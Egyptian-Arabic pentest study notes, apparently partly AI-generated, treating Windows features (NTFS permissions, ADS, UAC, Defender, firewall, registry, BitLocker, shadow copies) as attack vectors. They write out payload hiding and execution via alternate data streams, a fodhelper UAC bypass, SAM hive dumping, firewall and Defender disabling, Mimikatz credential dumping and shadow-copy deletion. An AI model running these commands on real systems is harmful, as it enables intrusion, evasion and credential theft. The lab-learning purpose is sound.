### 1. NTFS Permissions (الأذونات على الملفات والمجلدات)
- ده أهم سبب للـ privilege escalation في ويندوز.
- لو لقيت إن مجموعة **Users** أو **Everyone** عنده **Modify** أو **Full Control** على مجلد حساس (زي Program Files، أو مجلد خدمة، أو حتى جزء من System32)، تقدر تستغل ده عشان:
  - تضيف/تعدل/تحذف DLLs (DLL hijacking)
  - تغير binary الخدمة (service hijacking)
  - تضيف scheduled task أو startup item

**أوامر سريعة تبدأ بيها :**
- `icacls "C:\path\to\folder" /T` → يوريك كل الأذونات بشكل مفصل
- PowerShell:  
  ```powershell
  Get-Acl -Path "C:\important\folder" | Format-List
  ```
  أو أحسن:  
  ```powershell
  Get-ChildItem "C:\" -Recurse -ErrorAction SilentlyContinue | Get-Acl | Where-Object {$_.AccessToString -match "Users|Everyone" -and $_.AccessToString -match "Modify|FullControl"} | Select Path, AccessToString
  ```

**أدوات حديثة :**
- **WinPEASx64.exe** (أو WinPEAS.bat) → يلاقي weak permissions تلقائي ويصنفها (أفضل حاجة للمبتدئين)
- **SharpUp** → audit weak permissions, unquoted paths, etc.
- **PowerView** (Invoke-AllChecks) → لسه ممتاز في domain environments

**نصيحة:** في الـ bug bounty/internal → ابدأ دايمًا بـ WinPEAS، لو لقيت "modifiable" على service binary أو folder → غالبًا PoC سهل.

### 2. Alternate Data Streams (ADS) – الجزء الجامد ده
- فكرة بسيطة: كل ملف في NTFS عنده "stream" رئيسي (اللي تشوفه عادي)، + ممكن streams مخفية زي `file.txt:secret` أو `innocent.jpg:payload.exe`
- المخفي ده:
  - مش بيظهر في Explorer أو dir عادي
  - حجم الملف الرئيسي ما بيتغيرش (AV مش بيشك فيه بسهولة)
  - ممكن تخبي payload، script، exe، shellcode جواه

**ليه لسه مهم ؟**
- Red teamers لسه بيستخدموه عشان:
  - يخبوا payloads ويتفادوا AV/EDR (خصوصًا مع shellcode loaders)
  - persistence stealthy
  - defense evasion (MITRE T1564.004)
  - في exploits حديثة زي WinRAR CVE-2025-8088 (path traversal + ADS hiding)
- AV بقى أحسن في الكشف، لكن لو عملت loader ذكي (مش exe مباشر)، لسه بيعدي كتير.

**أوامر عملية سهلة (كلها شغالة دلوقتي):**

- **عرض الـ ADS:**
  ```cmd
  dir /R               → يوري كل streams في المجلد
  more < file.txt:streamname
  type file.txt:hidden
  ```

- **إنشاء ADS:**
  ```cmd
  echo "Hello hidden" > normal.txt:hidden.txt
  type payload.exe > innocent.pdf:evil.exe
  ```

- **قراءة/نسخ:**
  ```cmd
  more < normal.txt:hidden.txt
  copy normal.txt:hidden.txt C:\temp\extracted.exe
  ```

- **تنفيذ مباشر :**
  ```cmd
  rundll32.exe normal.dll:hidden.dll,DllMain
  powershell -ep bypass -c "IEX (Get-Content benign.ps1:evil -Stream evil)"
  wmic process call create "cmd /c normal.txt:backdoor.exe"
  forfiles /M "*.txt" /C "cmd /c type @file:payload > C:\temp\run.exe & C:\temp\run.exe"
  ```

**أدوات للـ hunt/enumeration :**
- **streams.exe** (Sysinternals – أفضل وأسرع):
  ```cmd
  streams -s C:\     → يسكان كل الـ C: ويوري كل ADS
  streams -d file.txt:hidden → يمسح stream
  ```
- PowerShell:
  ```powershell
  Get-Item -Path .\file.txt -Stream * | Select Stream, Length
  Get-Content .\file.txt -Stream hidden
  ```
- **LADS** أو scripts custom في GitHub (لسه موجودة)

**نصايح عملية ليكي:**
- في VM/lab: جربي تخبي exe جوا txt، وبعدين نفذيه بـ rundll32 أو powershell → هتلاقي الـ AV ممكن يعديه لو الـ exe مش signed.
- في real pentest: دوري في %TEMP%, AppData, Downloads, %APPDATA% → malware كتير بيحط persistence هناك.
- لو لقيتي ADS غريب (زي :Zone.Identifier كبير أو :payload) → ممكن يكون malicious.
### 3. أنواع الحسابات (Administrator vs Standard User)
- **Administrator**: يقدر يعمل تغييرات نظامية (install programs, add users, modify settings, change groups).
- **Standard User**: محدود جدًا (مش بيقدر ينصب برامج أو يغير إعدادات حساسة).

**في الـ pentest:**
- لو وجدتي حساب **Standard** بس، لازم تعملي **UAC bypass** أو **priv esc** عشان توصلي لـ elevated privileges.
- كتير من الـ exploits بتبدأ من standard user → تحاولي escalate لـ admin أو SYSTEM.

**أوامر سريعة تشوفي بيها الحسابات:**
- `net user` → يوري كل local users + status (active/disabled)
- `net localgroup administrators` → يوري مين في مجموعة الـ admins (مهم جدًا، لو لقيتي domain user أو service account هنا → vector كبير)
- `lusrmgr.msc` (Run → lusrmgr.msc) → GUI لإدارة users/groups، تشوفي memberships وتعدلي (لو عندك privs)

**نصيحة:** في internal pentest، دايمًا شغلي:
```cmd
net localgroup administrators
net users
whoami /groups
```
لو لقيتي حسابات زيادة في admins → ممكن credential dumping أو lateral movement.

### 4. User Profiles (C:\Users\)
- كل user عنده folder تحت C:\Users\ (مثل C:\Users\Administrator, C:\Users\StandardUser)
- فيه subfolders: Desktop, Documents, Downloads, AppData (مهم جدًا)

**في الـ hunt:**
- AppData\Roaming و Local → malware persistence كتير هنا (startup items, scheduled tasks, run keys)
- Downloads و Desktop → أحيانًا payloads أو configs مخفية
- ابحثي عن weak permissions على folders دي (Modify/Full control لـ Everyone أو Users) → ممكن replace files لـ escalation

أداة: **WinPEAS** أو **SharpUp** يلاقوا weak folders تلقائي.

### 5. User Account Control (UAC) – أهم نقطة هنا
- UAC بيحمي الـ admin accounts: حتى لو logged in كـ admin، العمليات اللي محتاجة high privileges بتطلب prompt (shield icon).
- Built-in Administrator (اللي اسمه Administrator) → UAC مش بيطبق عليه default (يعني elevated دايمًا).
- Standard user → لو حاول ينصب برنامج أو يعدل حاجة حساسة → UAC prompt (يطلب admin password).

**الـ shield icon:** معناه البرنامج auto-elevates أو محتاج elevation (مثل installers).

**في الـ pentest  :**
UAC bypasses لسه موجودة وبتُستخدم في red teaming وبعض malware (Microsoft مش بتعدها vuln حقيقي، بس بتُصلح بعضها).

**تقنيات لسه فعالة (من UACME وغيرها في 2025–2026):**
- **UACME** (https://github.com/hfiref0x/UACME) → أفضل repo، فيه +60 method، كتير شغال على Win11 24H2+.
  - Methods زي SilentCleanup (method 34 variants)، fodhelper.exe، slui.exe، ICMLuaUtil COM، event viewer، char map exploits (eudcedit.exe new 2025).
- **netplwiz bypass** → GUI trick لسه بيشتغل في بعض configs.
- **Task Scheduler abuses** → new vulns في schtasks.exe (credentials-based bypass، runlevel HIGHEST).
- **COM interfaces** → زي Security Center CPL hijack (ByeIntegrity3).

**أمثلة أوامر/طرق شغالة:**
- fodhelper.exe bypass (كلاسيكي):
  ```cmd
  reg add hkcu\software\classes\ms-settings\shell\open\command /v DelegateExecute /t REG_SZ /f
  reg add hkcu\software\classes\ms-settings\shell\open\command /d "cmd.exe" /f
  fodhelper.exe
  ```
- SilentCleanup variant (2025+):
  شغلي schtasks مع modifications عشان bypass.

**نصيحة قوية:**
- شغلي UACME أول حاجة في lab (akagi64.exe مع method مناسب).
- لو bypass نجح → هتفتحي high IL cmd بدون prompt → privilege escalation سهلة.
- في bug bounty/internal: لو وجدتي UAC bypass جديد أو variant → report كـ high severity.

### 6. Settings vs Control Panel vs Task Manager
- Settings (modern) + Control Panel (classic) → لتغيير system settings.
- Programs and Features → يوري installed apps (مفيد تشوفي إيه مثبت، لو فيه vulnerable software).

**في الـ recon:**
- `wmic product get name,version` أو PowerShell `Get-WmiObject -Class Win32_Product` → list installed programs.
- Task Manager (Ctrl+Shift+Esc) → شوفي processes، CPU/RAM، startup items (مهم لـ persistence hunt).

**Task Manager مفيد في pentest:**
- Processes tab → شوفي suspicious processes.
- Startup tab → weak startup entries → replace executable.
- Details → right-click → Open file location → check weak permissions.

### خلاصة اللي يفيد دلوقتي :
- **Enumeration أساسي:** net user/group, whoami /groups, lusrmgr.msc
- **Weaknesses شائعة:** weak local group memberships (extra admins), weak profile folders permissions
- **UAC bypass** → أهم vector لـ escalation من standard → admin/SYSTEM
- **أدوات تبدأي بيها:** WinPEAS, SharpUp, UACME, PowerUp (PowerShell)
- ابدأي enumeration → لو standard user → جربي bypass → لو نجح → dump creds أو install backdoor.

### 7. MSConfig (System Configuration)
- **مفيد في الـ pentest ليه؟**
  - Services tab: تشوفي كل الخدمات (حتى اللي مش running)، وتشوفي إيه اللي ممكن تعطّليه أو تستغليه.
  - Startup tab: في Windows client بيحيلك على Task Manager، لكن في Server → لازم تشوفي Startup folder يدويًا.
  - Tools tab: shortcuts لأدوات مهمة زي Event Viewer، UAC settings، Computer Management...

**أوامر/طرق سريعة:**
```cmd
msconfig          → افتحها (تحتاج admin)
shell:startup     → افتح Startup folder مباشرة (مهم لـ persistence hunt في servers)
```

**نصيحة hunt:**
- في server → دوري في C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
- لو لقيتي shortcut أو exe غريب → ممكن persistence vector (replace أو analyze).

### 8. Advanced System Settings → Performance → Pagefile
- Pagefile.sys (virtual memory) → في بعض الحالات بيحتوي على sensitive data (passwords، tokens، memory dumps).
- لو عندك access → ممكن dump جزء من الذاكرة.

**في الـ pentest:**
- ابحثي عن pagefile.sys في C:\ (hidden system file).
- أداة: **winpmem** أو **DumpIt** لـ memory acquisition، لكن pagefile نفسه ممكن يُحلل بـ Volatility لو extracted.

**نصيحة:** لو لقيتي pagefile كبير و permissions ضعيفة → vector لـ credential dumping (نادر لكن موجود).

### 9. Startup and Recovery → Crash Dumps
- Windows بيعمل memory dump عند BSOD (ملفات زي MEMORY.DMP أو minidump في C:\Windows\Minidump).
- الـ dump ده ممكن يحتوي على passwords، hashes، tokens، processes...

**في الـ hunt (مهم جدًا):**
- دوري على:
  - C:\Windows\MEMORY.DMP
  - C:\Windows\Minidump\*.dmp
- أدوات تحليل (لسه قوية 2026):
  - **Volatility 3** (vol.py windows.memmap.Memmap)
  - **WinDbg** / **Rekall**
  - **Bulk Extractor** لـ strings و creds

**نصيحة:** لو لقيتي dump file مع Write permission → extract و hunt لـ LSASS secrets أو SAM hashes.

### 10. Computer Management (compmgmt.msc)
- **Task Scheduler** (مهم جدًا لـ persistence & priv esc)
  - Scheduled tasks بتشتغل بـ SYSTEM أو high privs كتير.
  - Trigger: At logon، every X minutes، At startup...

**Hunt commands (لسه أفضل):**
```powershell
Get-ScheduledTask | Where-Object {$_.Principal.UserId -eq "NT AUTHORITY\SYSTEM"} | Select TaskName, Actions, Triggers
schtasks /query /fo LIST /v
```

**أدوات:**
- **SharpPersist** أو **SchtasksAbuse** scripts
- WinPEAS → يلاقي weak scheduled tasks (unquoted path، weak permissions على binary).

**Vector شائع:** لو الـ task بيشتغل exe في مجلد writable → replace الـ exe بـ reverse shell.

- **Event Viewer** (eventvwr.msc)
  - Logs مهمة لـ detection evasion أو forensics (Security, System, Application).
  - في pentest: شوفي failed logons (Event ID 4625)، successful logons (4624)، process creation (4688).

**أوامر PowerShell حديثة:**
```powershell
Get-WinEvent -LogName Security -MaxEvents 100 | Where-Object {$_.Id -eq 4625} | Select TimeCreated, Message
wevtutil qe Security /c:50 /rd:true /f:text
```

- **Shared Folders** → شوفي administrative shares (C$, ADMIN$, IPC$) → لو مفتوحة → SMB enumeration أو access.
- **Local Users and Groups** → lusrmgr.msc (شوفي admins، RDP users، Remote Management Users).
- **Services** → services.msc
  - Startup type: Automatic/Delayed/Manual/Disabled
  - Path to executable: لو unquoted أو writable → service hijacking.

**أوامر سريعة:**
```cmd
sc query
Get-Service | Select Name, Status, StartType, DisplayName
Get-WmiObject win32_service | Select Name, PathName, StartMode
```

**Vector:** Weak service binary permissions → replace binary بـ payload (WinPEAS يلاقي ده).

### 11. UAC Settings (من Tools في msconfig)
- لو قدرتي توصلي للـ slider وتغيريه لـ Never notify → UAC bypass كامل (لكن نادر في real engagements).
- في الـ hunt: شوفي current level (غالباً Notify for apps).

### خلاصة الـ hunt priorities في الـ module ده :
1. **Task Scheduler** → weak tasks / SYSTEM tasks / writable binaries
2. **Services** → unquoted service paths، weak permissions على binPath
3. **Startup folder** (في servers) → persistence check
4. **Event Logs** → recon لـ logons، processes، failed attempts
5. **Crash dumps / pagefile** → memory secrets
6. **Admin shares** → SMB access check

**أدوات أساسية تبدأي بيها في VM/lab:**
- WinPEASx64.exe
- SharpUp audit
- PowerView / SharpView (لـ scheduled tasks & services)
- Seatbelt.exe (من Ghostpack)

### 12. System Information (msinfo32.exe)
- **ليه مهم في الـ pentest؟**
  - يعطيك view شامل عن:
    - Hardware (processor, RAM, BIOS version)
    - Software Environment (running processes, loaded modules, drivers, services, startup programs, environment variables, installed programs, network connections)
    - Environment Variables (مثل %PATH%, %TEMP%, %WINDIR%) – مهم جدًا لـ path hijacking أو finding writable locations

**أوامر/طرق سريعة:**
```cmd
msinfo32          → افتحها (تحتاج admin أحيانًا)
msinfo32 /report C:\temp\sysinfo.txt   → export report كامل (نصيحة: export و download لو في VM/lab)
```

**نصايح hunt:**
- Export الـ report → ابحثي داخليه عن:
  - "Path" → weak paths في %PATH% (unquoted أو writable folders)
  - "Loaded Modules" → suspicious DLLs
  - "Startup Programs" → persistence
  - "Network Connections" → open ports/connections
- في real engagement: msinfo32 report بيُستخدم كـ artifact في reports أو forensics.

### 13. Resource Monitor (resmon.exe)
- **ليه مهم؟**
  - أفضل من Task Manager في بعض الحالات:
    - يوريك per-process: CPU, Memory, Disk, Network usage
    - File handles & modules (أي process ماسك أي file/DLL)
    - Associated Handles → find file locking conflicts
    - Network activity → IPs, ports, sent/received bytes

**أوامر:**
```cmd
resmon            → افتحها مباشرة
```

**في الـ pentest (مهم جدًا):**
- Network tab → شوفي suspicious connections (C2, reverse shells)
- Disk tab → شوفي إيه الـ processes اللي بتكتب/تقرأ في sensitive folders
- CPU/Memory → identify high-usage suspicious processes (crypto miners, miners)
- Associated Handles → find if malware ماسك registry keys أو files

**نصيحة:** لو شفتي process غريب ماسك LSASS أو SAM → credential dumping vector.

### 14. Command Prompt – الأوامر الأساسية (اللي ذكروها)
- hostname → اسم الجهاز (مهم لـ naming في reports أو lateral movement)
- whoami → current user + privs (whoami /all أفضل)
- ipconfig → network config (IP, gateway, DNS) – أول حاجة في recon
- netstat → connections & listening ports
- net → manage users/groups/shares/sessions

**أوامر مفيدة جدًا :**
```cmd
whoami /all                → groups, privs, SID
ipconfig /all              → full network info + adapters
netstat -ano               → connections + PID (أفضل combo)
netstat -ano | findstr "LISTENING"   → listening ports
net user                   → list local users
net localgroup administrators   → admins group
net start                  → running services
net share                  → shared folders (C$, ADMIN$...)
net session                → connected users (SMB sessions)
```

**نصيحة قوية:**
- شغلي دايمًا:
  ```cmd
  whoami /all > C:\temp\whoami.txt
  ipconfig /all > C:\temp\ip.txt
  netstat -ano > C:\temp\netstat.txt
  net localgroup > C:\temp\groups.txt
  ```
  → export و download للـ report.

- net help user / net help localgroup → help للـ subcommands.

### 15. Windows Registry (regedit.exe)
- **ليه أهم حاجة في الـ pentest؟**
  - Persistence (Run keys, Services, Scheduled tasks)
  - Privilege escalation (weak permissions على keys)
  - Credential storage (SAM, LSA secrets)
  - Configuration (UAC level, features)

**أوامر سريعة (بدل regedit GUI):**
```cmd
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run   → startup programs
reg query HKLM\SYSTEM\CurrentControlSet\Services               → services paths
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"   → Winlogon persistence
reg save HKLM\SAM C:\temp\sam.hive          → export SAM hive (لو privs)
reg save HKLM\SYSTEM C:\temp\system.hive
```

**نصايح hunt :**
- Weak registry permissions → reg query + icacls على keys
- Common persistence locations:
  - HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
  - HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
  - HKLM\SYSTEM\CurrentControlSet\Services\<service>\ImagePath
- أدوات: **Autoruns** (Sysinternals) أفضل لـ enumerate persistence
- WinPEAS → يلاقي suspicious registry entries تلقائي

**تحذير:** ماتعدليش registry بدون backup، لكن في lab جربي export/import hives.

### خلاصة الـ priorities في الجزء ده:
1. **msinfo32** → export report → hunt environment variables + startup + drivers
2. **resmon** → network/disk handles → detect C2 أو file locks
3. **cmd basics** → whoami /all + ipconfig /all + netstat -ano + net user/group/share
4. **Registry** → persistence & escalation vectors (Run keys, services, weak perms)

**أدوات تبدأي بيها في VM:**
- WinPEAS (يغطي registry, startup, env vars, services...)
- Autoruns64.exe (Sysinternals)
- Seatbelt.exe (Ghostpack) – windows.autoruns

تمام يا فاطمة، الجزء ده من Windows Fundamentals 3 (أو Security module) بيركز على **الـ security features** اللي موجودة في ويندوز، وده مهم جدًا في الـ pentest والبج باونتي لأنك لازم تعرفي إيه اللي مفعّل وإيه اللي ممكن تستغليه أو تبايباسيه.

هلخص بس **النقاط اللي تفيد في الهجوم / الاختبار / الـ bypass**، مع نصايح وأوامر حديثة (2026) لسه شغالة قوي، وأركز على الضعف الشائع والـ vectors.

### 16. Windows Update & Patch Tuesday
- **في الـ pentest:**
  - الـ VMs / servers القديمة غالبًا مش patched → vulnerabilities معروفة (PrintNightmare, Zerologon, PetitPotam, CVE-2025-XXXX series).
  - لو الـ update "managed" أو مش متصل بالإنترنت → يعني مش هيحصل patching تلقائي → فرصة كبيرة لـ unpatched vulns.

**نصايح hunt:**
- شغلي:
  ```cmd
  systeminfo | findstr /B /C:"Hotfix(s)" /C:"Installed On"
  wmic qfe list full
  ```
  → يوريك كل الـ patches المثبتة + تاريخها.
- لو الـ machine قديمة (مثل Server 2019 بدون updates بعد 2023) → ابحثي عن CVEs زي:
  - CVE-2021-34527 (PrintNightmare)
  - CVE-2020-1472 (Zerologon)
  - أي Print Spooler exploits

**أداة:** **Watson** أو **WinPEAS** → يقولك إيه الـ missing patches اللي ممكن تستغليها.

### 17. Virus & Threat Protection (Microsoft Defender Antivirus)
- **الإعدادات المهمة في الـ pentest:**
  - Real-time protection: لو off → payloads بتعدي بسهولة (زي في الـ VM).
  - Cloud-delivered protection: لو off → مش بيستخدم latest signatures من الـ cloud.
  - Controlled folder access: لو on → يحمي folders من ransomware، بس لو off → سهل write في Documents/Desktop.
  - Exclusions: لو في exclusions كتير → vector كبير (malware بيحط نفسه في excluded path).

**أوامر مهمة (PowerShell – لسه شغالة 2026):**
```powershell
Get-MpPreference                          # يوريك كل الـ settings (exclusions, real-time, etc.)
Get-MpThreat                              # current threats / quarantined
Get-MpComputerStatus                      # status of Defender (real-time on/off?)
Add-MpPreference -ExclusionPath "C:\temp" # إضافة exclusion (لو عندك privs)
```

**نصايح bypass / hunt:**
- لو Real-time off → ارفعي payload عادي (meterpreter, .exe reverse shell).
- لو exclusions موجودة → حطي payload في الـ excluded folder.
- Bypass حديث (2025–2026): AMSI bypass + Defender signature evasion بـ obfuscated PowerShell أو Donut لـ shellcode.
- أداة: **AMSI.fail** scripts أو **Invoke-Obfuscation** لـ bypass AMSI/Defender.

**Tip:** Right-click أي file → Scan with Defender → لو مش بيحذف → يعني ممكن يكون bypassed أو excluded.

### 17. Firewall & Network Protection (Windows Defender Firewall)
- **Profiles:**
  - Domain: domain-joined machines (غالباً strict).
  - Private: home/trusted networks (أقل strict).
  - Public: public Wi-Fi (أكتر حماية، blocks incoming default).

**في الـ pentest:**
  - لو Public profile → incoming connections blocked default → صعب reverse shell من خارج.
  - لو Private/Domain → ممكن inbound open ports (RDP 3389, SMB 445...).

**أوامر مهمة:**
```cmd
netsh advfirewall show currentprofile    # يوريك الـ profile الحالي
netsh advfirewall firewall show rule name=all   # كل الـ rules
netsh advfirewall set currentprofile state off  # turn off firewall (لو privs)
```

**نصايح:**
- لو عايزة تفتحي port لـ C2:
  ```cmd
  netsh advfirewall firewall add rule name="Allow 4444" dir=in action=allow protocol=TCP localport=4444
  ```
- Hunt: شوفي إيه الـ apps المسموحة (Allow an app through firewall) → لو فيه suspicious app open inbound → vector.
- أداة: **netstat -ano** + firewall rules → شوفي open ports + اللي مسموح.

### 18. App & Browser Control (Microsoft Defender SmartScreen)
- **Check apps and files:** Warn/Block/Off
- لو Off أو Warn بس → payloads من الإنترنت بتعدي (downloads غير signed).

**في الـ pentest:**
  - Bypass SmartScreen: 
    - Use Zone.Identifier ADS → mark file كـ downloaded من internet لكن bypass.
    - Right-click → Unblock (في properties).
    - Obfuscate filename/extension (مثل .pdf.exe أو double extension tricks).
  - حديث 2026: SmartScreen bypass بـ Mark-of-the-Web (MotW) removal scripts أو LOLBAS (certutil, bitsadmin).

### 19. Exploit Protection
- Built-in mitigations (زي DEP, ASLR, CFG, child process restriction...).
- Default settings قوية، لكن لو customized أو off → أسهل exploitation (ROP chains, etc.).

**نصيحة:** WinPEAS أو **Check-ExploitProtection** scripts يوروك الـ mitigations الضعيفة.

### خلاصة الـ hunt priorities في الـ module ده :
1. **Defender status** → Real-time off? Exclusions? → payload delivery سهل.
2. **Firewall rules** → open inbound ports? Weak profile? → C2 / lateral movement.
3. **Missing patches** → systeminfo + wmic qfe → search Exploit-DB / Nuclei templates.
4. **SmartScreen / Exploit Protection** → bypass لـ unsigned malware أو exploits.
5. **Controlled Folder Access** → لو off → ransomware simulation أو file write attacks.

**أدوات أساسية تبدأي بيها:**
- WinPEAS → يغطي Defender, Firewall, patches, exclusions.
- Seatbelt → windows.defense
- PowerShell: Get-MpPreference, Get-NetFirewallRule
### 20. Core Isolation → Memory Integrity
- **إيه هي؟** ميزة في Windows 10/11/Server تعتمد على Virtualization-Based Security (VBS) عشان تمنع injection malicious code في high-integrity processes (زي kernel drivers، LSASS، credential processes).
- **في الـ pentest:**
  - لو Memory Integrity **on** → كتير من الـ credential dumping tools (Mimikatz classic, SharpDump, ProcDump) بتفشل أو بتكتشف.
  - لو **off** (شائع في servers أو machines قديمة) → dumping LSASS سهل جدًا.

**أوامر تشوفي status (PowerShell – لسه شغالة):**
```powershell
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard
# أو أفضل:
Get-ComputerInfo | Select WindowsProductName, CsDeviceGuardSmartStatus, DeviceGuardSmartStatus
```

**بypass / hunt:**
- لو Memory Integrity off → استخدمي:
  - **Mimikatz** → sekurlsa::logonpasswords
  - **SharpDump** أو **Outflank-Dumpert**
- لو on → تحتاجي advanced bypasses زي:
  - Kernel exploits (CVE-2024-30078 variants أو driver exploits)
  - HVCI bypass بـ custom drivers أو LOLBAS
- نصيحة: WinPEAS يقولك الـ status في قسم "Mitigations" أو "AV/EDR".

### 21. Trusted Platform Module (TPM) + BitLocker
- **TPM**: hardware chip (1.2 أو 2.0) بيخزن encryption keys بأمان، ويمنع boot tampering.
- **BitLocker**: full disk encryption (FDE) – يحمي الـ data لو الجهاز مسروق أو offline.
  - أفضل مع TPM + PIN أو TPM-only.

**في الـ pentest:**
- لو BitLocker **on** مع TPM → صعب جدًا extract data offline (cold boot attacks نادرة دلوقتي).
- لو **off** أو **suspend** → الـ disk readable لو عملتي physical access أو boot من USB.
- في VMs/servers: غالبًا BitLocker مش مفعل (زي في الـ VM دي).

**أوامر مهمة:**
```powershell
manage-bde -status              # status كل drives (Locked/Protected/Decrypted)
manage-bde -protectors -get C:  # يوريك protectors (TPM, PIN, recovery key ID)
Get-BitLockerVolume             # PowerShell equivalent
```

**Vectors شائعة:**
- Recovery key hunt: لو لقيتي BitLocker recovery key في AD، files، emails، notes → decrypt.
- Suspend BitLocker (لو admin): `manage-bde -protectors -disable C:`
- Offline: لو مش مفعل TPM → brute force weak PINs أو extract keys من memory dump.
- نصيحة: في internal pentest → دايمًا check manage-bde -status أول حاجة لو physical/logical access.

### 23. Volume Shadow Copy Service (VSS) / System Restore Points
- **إيه هي؟** snapshots للـ files/system state عشان restore لو حصل مشكلة.
- **في الـ ransomware / malware:**
  - أغلب ransomware بيحذف الـ shadow copies أول حاجة عشان يمنع الـ recovery (vssadmin delete shadows /all /quiet).
  - لو VSS مفعل ومش محذوف → ممكن تستعيدي files بعد attack (أو تستخرجي secrets من old snapshots).

**أوامر مهمة (للـ hunt):**
```cmd
vssadmin list shadows              # يوريك كل الـ shadow copies الموجودة
vssadmin list shadowstorage        # مساحة مخصصة للـ shadows
diskshadow                         # advanced tool لـ create/query/delete
```

**في الـ pentest:**
- لو shadows موجودة → حاولي extract sensitive files منها (مثل SAM، SYSTEM hives، configs).
- أداة: **ShadowCopyView** (NirSoft) أو **vssadmin** + mount shadow copy.
- لو malware deleted shadows → report كـ indicator of compromise (IoC) في forensics.
- نصيحة: في labs زي Advent of Cyber Day 23 → جربي create shadow → delete → recover → عشان تفهمي الـ impact.

### خلاصة الـ hunt priorities في الجزء ده :
1. **Memory Integrity / Core Isolation** → off؟ → LSASS dumping سهل.
2. **BitLocker / TPM** → off أو suspended؟ → data accessible offline.
3. **VSS / Shadow Copies** → موجودة؟ → recover files أو secrets، محذوفة؟ → ransomware behavior.
4. **General** → شوفي الـ status بسرعة بـ WinPEAS أو Seatbelt (windows.security).

**أوامر سريعة تبدأي بيها في VM/lab:**
```powershell
Get-CimInstance Win32_DeviceGuard
manage-bde -status
vssadmin list shadows
```

لو Memory Integrity off + BitLocker off + VSS موجود → الـ machine ضعيف جدًا، وده شائع في misconfigured servers.


You can read more [here](https://gemini.google.com/share/025c5325cd86)
And Done :)